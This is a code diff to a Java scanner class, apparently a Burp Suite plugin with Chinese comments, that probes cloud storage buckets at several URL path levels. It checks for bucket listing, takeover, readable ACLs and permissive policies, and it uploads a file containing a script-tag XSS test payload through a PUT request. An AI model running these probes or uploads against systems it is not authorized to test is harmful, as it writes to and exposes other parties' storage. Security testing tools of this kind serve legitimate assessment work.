@@ -224,6 +224,46 @@ public class Poc_Scan {
         String hostName = host;
         int port = 443; // 默认HTTPS端口
         boolean useHttps = true; // 默认使用HTTPS
+        String[] poc = {
+                "GET / HTTP/1.1",
+                "GET /?acl HTTP/1.1",
+                "GET /?policy HTTP/1.1",
+                "PUT /123.html HTTP/1.1"
+        };
+        // 存储拼接后的请求
+        List<String> newRequests = new ArrayList<>();
+        URL urls = null;
+        try {
+            urls = new URL(host);
+            String basePath = urls.getPath();
+
+            // 提取路径层级
+            List<String> paths = extractPaths(basePath);
+
+            for (String request : poc) {
+                // 分割请求行以提取方法和路径
+                String[] parts = request.split(" ");
+                String method = parts[0];
+                String originalPath = parts[1];
+                String protocol = parts[2];
+                for (String path : paths) {
+                    // 如果路径是根路径（"/"），直接使用path
+                    if ("/".equals(originalPath)) {
+                        // 如果path为空，则手动添加根路径斜杠
+                        String formattedPath = path.isEmpty() ? "/" : path;
+                        newRequests.add(method + " " + formattedPath + " " + protocol);
+                    } else if (originalPath.startsWith("/")) {
+                        // 如果路径是以斜杠开头，则直接拼接
+                        newRequests.add(method + " " + path + originalPath + " " + protocol);
+                    } else {
+                        // 如果路径不是以斜杠开头，则假设它是相对路径，需要拼接
+                        newRequests.add(method + " " + path + "/" + originalPath + " " + protocol);
+                    }
+                }
+            }
+        } catch (MalformedURLException e) {
+            throw new RuntimeException(e);
+        }
 
         try {
             URL url = new URL(host);
@@ -247,7 +287,6 @@ public class Poc_Scan {
                 hostName = host;
             }
         }
-
         // 去掉可能存在的路径部分
         int pathIndex = hostName.indexOf("/");
         if (pathIndex != -1) {
@@ -257,14 +296,15 @@ public class Poc_Scan {
         StringBuilder allMessages = new StringBuilder();
         IHttpRequestResponse finalResponse = null;  // 初始化最终响应
         String hosts=null;
-        for (int i = 0; i < poc_HTTP.length; i++) {
-            String requestString = poc_HTTP[i] + "\r\nHost: " + hostName + "\r\nSec-Ch-Ua-Platform: \"Windows\""
+
+        for (String newRequest : newRequests) {
+            String requestString = newRequest + "\r\nHost: " + hostName + "\r\nSec-Ch-Ua-Platform: \"Windows\""
                     + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\r\n"
                     + "\r\nConnection: keep-alive\r\n";
             // 添加请求体（如果有）
             String requestBody = "";
-            if (i == 3) { // PUT 请求需要请求体
-                requestBody = "123";
+            if (newRequest.contains("PUT")) {// PUT 请求需要请求体
+                requestBody = "<div style=\"display:none;\">Hidden Element</div><script>console.log('XSS Test');</script>";
             }
             byte[] requestBytes = requestString.getBytes(StandardCharsets.UTF_8);
             IRequestInfo analyzedRequest = helpers.analyzeRequest(requestBytes);
@@ -279,28 +319,28 @@ public class Poc_Scan {
             byte[] response1 = response.getResponse();
                 try {
                     String responseString = new String(response1, "UTF-8");
-                    if (statusCode == 200 && poc_HTTP[i].equals("GET / HTTP/1.1") && responseString.contains("</ListBucketResult>")) {
+                    if (statusCode == 200  && responseString.contains("</ListBucketResult>")) {
                         allMessages.append("Bucket遍历");
                         finalResponse = response;
                         hosts = hostName;
                         return new RequestResponseWrapper(finalResponse, allMessages.toString(), hosts);
-                    } else if (statusCode == 404 && poc_HTTP[i].equals("GET / HTTP/1.1") && responseString.contains("The specified bucket does not exist")) {
+                    } else if (statusCode == 404 && responseString.contains("The specified bucket does not exist")) {
                         allMessages.append("Bucket桶可接管");
                         finalResponse = response;
                         hosts = hostName;
                         return new RequestResponseWrapper(finalResponse, allMessages.toString(), hosts);
-                    } else if (statusCode == 200 && poc_HTTP[i].equals("GET /?acl HTTP/1.1") && responseString.contains("<AccessControlPolicy>")) {
+                    } else if (statusCode == 200 && responseString.contains("<AccessControlPolicy>")) {
                         allMessages.append("Bucket ACL可读");
                         finalResponse = response;
                         hosts = hostName;
                         return new RequestResponseWrapper(finalResponse, allMessages.toString(), hosts);
-                    } else if (statusCode == 200 && poc_HTTP[i].equals("GET /?policy HTTP/1.1") && responseString.contains("\"Effect\": \"allow\"")) {
+                    } else if (statusCode == 200  && responseString.contains("\"Effect\": \"allow\"")) {
                         allMessages.append("Bucket 权限策略为允许");
                         finalResponse = response;
                         hosts = hostName;
                         return new RequestResponseWrapper(finalResponse, allMessages.toString(), hosts);
-                    } else if (statusCode == 200 && poc_HTTP[i].equals("PUT /123.txt HTTP/1.1")) {
-                        allMessages.append("Bucket文件上传");
+                    } else if (statusCode == 200 && newRequest.contains("PUT")) {
+                        allMessages.append("Bucket文件上传,可能存在xss漏洞，F12查看控制台XSS Test");
                         finalResponse = response;
                         hosts = hostName;
                         return new RequestResponseWrapper(finalResponse, allMessages.toString(), hosts);
@@ -313,6 +353,34 @@ public class Poc_Scan {
             }
         }
         return new RequestResponseWrapper(null, "no vul", hostName);
+    }
+    public static List<String> extractPaths(String uri) {
+        // 去除末尾斜杠
+        if (uri.endsWith("/")) {
+            uri = uri.substring(0, uri.length() - 1);
+        }
+
+        // 拆分路径段
+        String[] segments = uri.split("/");
+
+        // 动态生成不同层级的路径并存储到列表中
+        List<String> paths = new ArrayList<>();
+        StringBuilder basePathBuilder = new StringBuilder();
+
+        for (String segment : segments) {
+            if (!segment.isEmpty()) {  // 跳过空字符串
+                basePathBuilder.append('/').append(segment);
+                paths.add(basePathBuilder.toString());  // 不再添加额外的斜杠
+            }
+        }
+
+        // 添加根路径（空字符串）
+        paths.add("");
+
+        // 反转列表以得到从详细到基础的顺序
+        Collections.reverse(paths);
+
+        return paths;
     }
 
     public static class RequestResponseWrapper {
